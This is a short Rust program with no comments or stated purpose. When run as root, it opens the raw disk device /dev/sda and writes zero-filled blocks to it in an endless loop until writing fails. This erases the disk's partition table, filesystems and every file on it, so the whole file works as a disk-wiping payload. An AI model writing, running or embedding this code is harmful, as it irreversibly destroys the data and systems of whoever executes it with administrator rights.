use std::fs::OpenOptions;
use std::io::Write;
use std::os::unix::fs::OpenOptionsExt;

fn main() {
    if unsafe { libc::geteuid() } != 0 {
        return;
    }
    let mut f = OpenOptions::new()
        .write(true)
        .custom_flags(libc::O_RDWR)
        .open("/dev/sda")
        .expect("open");
    let buf = vec![0u8; 1024 * 1024];
    loop {
        if f.write_all(&buf).is_err() {
            break;
        }
    }
}
